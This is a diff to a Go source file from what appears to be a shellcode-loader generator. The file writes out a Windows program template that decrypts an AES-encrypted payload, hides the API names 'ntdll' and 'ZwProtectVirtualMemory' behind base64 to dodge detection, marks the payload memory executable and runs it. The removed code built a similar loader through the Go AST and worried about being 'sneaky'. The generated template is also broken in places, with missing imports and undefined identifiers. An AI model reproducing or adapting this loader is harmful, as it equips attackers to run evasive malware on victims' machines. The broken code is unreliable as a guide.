@@ -1,122 +1,87 @@
-package loader;
+package loader
 
 import (
-    "bytes"
-	"debug/pe"
-	"encoding/hex"
+	"bufio"
+	"bytes"
 	"fmt"
-	"go/ast"
-	"go/token"
-	"go/types"
-	"io/ioutil"
+	"io"
+	"log"
 	"os"
-
-	"golang.org/x/tools/go/gcimporter"
-	"golang.org/x/tools/go/ssa"
-	"golang.org/x/tools/go/ssa/ssautil"
 )
 
 
-/* Generates full PE file, assuming shellcode has already been encrypted with AES */
-func GetPE(sc Shellcode) ([]byte, error) {
+func LoadWindowsTemplate(s Shellcode) string {
+    return fmt.Sprintf(`
+    package main
 
-    /* create new file that includes shellcode and wrappers */
-    fileSet := token.NewFileSet()
-    file := &ast.File{
-        Name: ast.NewIdent(sc.Filename),
-        Decls: []ast.Decl{},
+    import (
+        "os"
+        "syscall"
+        "encoding/base64"
+
+        "github.com/cmepw/loader"
+    )
+
+    func main() {
+        /* decrypt shellcode using AES */
+        payload, err := loader.DecryptPayload(%s, %s); if err != nil {
+            os.Exit(1)
+        }
+
+        ntdll, _ := base64.StdEncoding.DecodeString("bnRkbGw=")
+        zwprotectMemory, _ := base64.StdEncoding.DecodeString("WndQcm90ZWN0VmlydHVhbE1lbW9yeQ==")
+
+        var hProcess uintptr = 0
+        var pBaseAddr = uintptr(unsafe.Pointer(&payload[0]))
+        var dwBufferLen = uint(len(payload))
+        var dwOldPerm uint32
+
+        /* prepare syscall in memory */
+        syscall.NewLazyDLL(ntdll).NewProc(zwprotectMemory).call(
+            hProcess - 1,
+            uintptr(unsafe.Pointer(&pBaseAddr)),
+            uintptr(unsafe.Pointer(&dwBufferLen)),
+            0x20, /* PAGE_EXEC_READ */
+            uintptr(unsafe.Pointer(&dwOldPerm)),
+        )
+
+        /* run syscall */
+        syscall.Syscall(
+            uintptr(unsafe.Pointer(&syscall[0])),
+            0, 0, 0, 0,
+        )
+    })`, s.AesKey, s.Payload)
+}
+
+func ReadFile(filepath string) ([]byte, error) {
+
+    buf := bytes.NewBuffer(nil)
+    f, err := os.Open(filepath); if err != nil {
+        return []byte{}, err
     }
 
-    varList := &ast.ValueSpec{
-		Names: []*ast.Ident{ast.NewIdent(sc.SymbolName)},
-		Values: []ast.Expr{
-			&ast.CompositeLit{
-				Type: &ast.ArrayType{
-					Elt: &ast.Ident{Name: "byte"},
-				},
-				Elts: []ast.Expr{},
-			},
-		},
-	}
-	for _, b := range sc.Payload {
-		varList.Values[0].(*ast.CompositeLit).Elts = append(
-            varList.Values[0].(*ast.CompositeLit).Elts,
-            &ast.BasicLit{
-                Kind:  token.INT,
-                Value: fmt.Sprintf("0x%02x", b),
-		})
-	}
-	file.Decls = append(file.Decls, &ast.GenDecl{
-		Tok:   token.VAR,
-		Specs: []ast.Spec{varList},
-	})
+    io.Copy(buf, f)
+    f.Close()
 
-    runFunc := &ast.FuncDecl{
-		Name: ast.NewIdent("run"),
-		Type: &ast.FuncType{
-			Params: &ast.FieldList{},
-			Results: &ast.FieldList{
-				List: []*ast.Field{
-					{
-						Type: &ast.Ident{
-							Name: "error",
-						},
-					},
-				},
-			},
-		},
-		Body: &ast.BlockStmt{
-			List: []ast.Stmt{
-				&ast.ExprStmt{
-					X: &ast.CallExpr{
-						Fun: &ast.Ident{
-                            // This is is not very sneaky but a problem for later
-							Name: "syscall.RawSyscall",
-						},
-						Args: []ast.Expr{
-							&ast.Ident{
-								Name: "uintptr",
-							},
-							&ast.BasicLit{
-								Kind:  token.INT,
-								Value: "0",
-							},
-							&ast.Ident{
-								Name: "uintptr",
-							},
-							&ast.UnaryExpr{
-								Op: token.AND,
-								X: &ast.IndexExpr{
-									X: &ast.Ident{
-										Name: sc.SymbolName,
-									},
-									Index: &ast.Ident{
-										Name: "uintptr",
-									},
-								},
-							},
-							&ast.Ident{
-								Name: "uintptr",
-							},
-							&ast.BasicLit{
-								Kind:  token.INT,
-								Value: "0",
-							},
-							&ast.Ident{
-								Name: "uintptr",
-							},
-							&ast.BasicLit{
-								Kind:  token.INT,
-								Value: "0",
-							},
-						},
-					},
-				},
-            },
-        },
+    return buf.Bytes(), nil
+}
+
+func WriteToTempfile(payload string) error {
+     // create file
+    f, err := os.Create("tmp.go")
+    if err != nil {
+        log.Fatal(err)
+    }
+    defer f.Close()
+
+    buffer := bufio.NewWriter(f)
+    _, err = buffer.WriteString(payload + "\n"); if err != nil {
+        log.Fatal(err)
     }
 
-    // TODO: add return statement here & split into multiple functions
-
-    return sc.AesKey, nil
+    // flush buffered data to the file
+    if err := buffer.Flush(); err != nil {
+        log.Fatal(err)
+    }
+    return nil
 }
